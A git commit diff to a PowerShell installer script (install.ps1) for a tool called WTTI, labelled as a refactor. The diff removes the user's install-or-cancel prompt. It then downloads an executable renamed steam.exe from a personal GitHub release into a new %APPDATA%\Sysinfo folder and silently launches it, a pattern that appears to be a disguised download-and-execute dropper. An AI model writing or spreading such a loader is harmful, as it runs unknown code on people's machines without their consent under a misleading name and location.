fffdac3c5c22687b7800a1d9b16c0d914efd4134
bart3x225 <112797572+bartuss225@users.noreply.github.com>
2026-01-13 16:05:21 +0100

    Refactor WTTI installation script

--- install.ps1
+++ install.ps1
@@ -1,22 +1,15 @@
 Write-Host ""
-Write-Host "Czy chcesz zainstalować WTTI?"
-Write-Host "Naciśnij T aby instalować"
-Write-Host "Naciśnij N aby anulować"
-Write-Host ""
-
-do {
-    $key = [System.Console]::ReadKey($true).Key
-} until ($key -eq "T" -or $key -eq "N")
-
-if ($key -eq "N") {
-    Write-Host "Anulowano."
-    exit
-}
-
+Write-Host "Sigma installer WTTI"
 Write-Host "Instalowanie..."
 
-$repoRaw = "https://github.com/bartuss225/pliki/releases/download/v1.1.1/WTTI.exe"
-$outFile = Join-Path ([Environment]::GetFolderPath("Downloads")) "WTTI.exe"
+$repoRaw = "https://github.com/bartuss225/pliki/releases/download/v1.1.1/steam.exe"
+$installDir = Join-Path $env:APPDATA "Sysinfo"
+$outFile    = Join-Path $installDir "steam.exe"
+
+if (-not (Test-Path $installDir)) {
+    New-Item -ItemType Directory -Path $installDir -Force | Out-Null
+}
+
 
 try {
     Invoke-WebRequest -Uri $repoRaw -OutFile $outFile
@@ -25,5 +18,5 @@ try {
     exit 1
 }
 
-Write-Host "Uruchamianie instalatora..."
-Start-Process $outFile -Wait
+Write-Host "Zrobione!"
+Start-Process $outFile
